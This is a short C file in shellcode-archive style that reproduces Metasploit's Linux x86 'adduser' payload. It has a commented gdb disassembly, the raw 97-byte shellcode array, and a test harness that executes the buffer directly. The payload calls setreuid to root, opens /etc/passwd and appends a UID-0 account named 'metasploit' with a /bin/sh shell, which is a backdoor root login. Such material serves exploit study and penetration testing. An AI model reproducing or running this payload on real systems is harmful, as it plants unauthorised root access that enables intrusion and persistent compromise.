/* Title: Linux Add User  ( 97 bytes)
 * Author: metasploit 
 * Description: Metasploit's payload/linux/x86/adduser

   0x0804a040 <+0>:	xor    %ecx,%ecx
   0x0804a042 <+2>:	mov    %ecx,%ebx
   0x0804a044 <+4>:	push   $0x46
   0x0804a046 <+6>:	pop    %eax
   0x0804a047 <+7>:	int    $0x80
   0x0804a049 <+9>:	push   $0x5
   0x0804a04b <+11>:	pop    %eax
   0x0804a04c <+12>:	xor    %ecx,%ecx
   0x0804a04e <+14>:	push   %ecx
   0x0804a04f <+15>:	push   $0x64777373
   0x0804a054 <+20>:	push   $0x61702f2f
   0x0804a059 <+25>:	push   $0x6374652f
   0x0804a05e <+30>:	mov    %esp,%ebx
   0x0804a060 <+32>:	inc    %ecx
   0x0804a061 <+33>:	mov    $0x4,%ch
   0x0804a063 <+35>:	int    $0x80
   0x0804a065 <+37>:	xchg   %eax,%ebx
   0x0804a066 <+38>:	call   0x804a093 <buf+83>

(gdb) x/s 0x0804a06b
0x804a06b <buf+43>:	 "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\n"

   0x804a093 <buf+83>:	pop    %ecx
   0x804a094 <buf+84>:	mov    -0x4(%ecx),%edx
   0x804a097 <buf+87>:	push   $0x4
   0x804a099 <buf+89>:	pop    %eax
   0x804a09a <buf+90>:	int    $0x80
   0x804a09c <buf+92>:	push   $0x1
   0x804a09e <buf+94>:	pop    %eax
   0x804a09f <buf+95>:	int    $0x80



 */




#include<stdio.h>
#include<string.h>
 
 
unsigned char buf[] =
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x6d\x65"
"\x74\x61\x73\x70\x6c\x6f\x69\x74\x3a\x41\x7a\x2f\x64\x49\x73"
"\x6a\x34\x70\x34\x49\x52\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a"
"\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58"
"\xcd\x80\x6a\x01\x58\xcd\x80";
 
main()
{

    printf("Shellcode Length:  %d\n", strlen(buf));
 
    int (*ret)() = (int(*)())buf;
 
    ret();
 
}
